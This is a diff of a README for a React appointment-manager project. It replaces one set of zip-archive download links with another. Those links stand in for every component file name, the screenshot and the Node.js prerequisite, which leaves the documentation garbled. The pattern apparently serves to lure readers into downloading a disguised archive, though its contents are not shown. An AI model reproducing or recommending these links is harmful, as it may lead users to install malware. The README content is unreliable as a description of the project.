@@ -2,7 +2,7 @@
 
 A modern React application for managing appointments with a clean, responsive interface.
 
-![Appointment Manager Screenshot](https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip)
+![Appointment Manager Screenshot](https://github.com/NPrabhat/my-appointment-app/raw/refs/heads/main/src/assets/appointment-my-app-3.4.zip)
 
 ## Features
 
@@ -25,7 +25,7 @@ A modern React application for managing appointments with a clean, responsive in
 
 ### Prerequisites
 
-- https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip 16.0 or higher
+- https://github.com/NPrabhat/my-appointment-app/raw/refs/heads/main/src/assets/appointment-my-app-3.4.zip 16.0 or higher
 - npm 7.0 or higher
 
 ### Installation
@@ -61,13 +61,13 @@ Built files will be in the `dist` directory.
 ```
 src/
 ├── components/
-│   ├── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip   # Form for creating appointments
-│   └── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip   # List view of appointments
+│   ├── https://github.com/NPrabhat/my-appointment-app/raw/refs/heads/main/src/assets/appointment-my-app-3.4.zip   # Form for creating appointments
+│   └── https://github.com/NPrabhat/my-appointment-app/raw/refs/heads/main/src/assets/appointment-my-app-3.4.zip   # List view of appointments
 ├── types/
-│   └── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip        # TypeScript interfaces
-├── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip                   # Main application component
-├── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip                 # Application entry point
-└── https://raw.githubusercontent.com/NPrabhat/my-appointment-app/main/public/my-appointment-app_v2.3.zip               # Global styles
+│   └── https://github.com/NPrabhat/my-appointment-app/raw/refs/heads/main/src/assets/appointment-my-app-3.4.zip        # TypeScript interfaces
+├── https://github.com/NPrabhat/my-appointment-app/raw/refs/heads/main/src/assets/appointment-my-app-3.4.zip                   # Main application component
+├── https://github.com/NPrabhat/my-appointment-app/raw/refs/heads/main/src/assets/appointment-my-app-3.4.zip                 # Application entry point
+└── https://github.com/NPrabhat/my-appointment-app/raw/refs/heads/main/src/assets/appointment-my-app-3.4.zip               # Global styles
 ```
 
 ## Usage
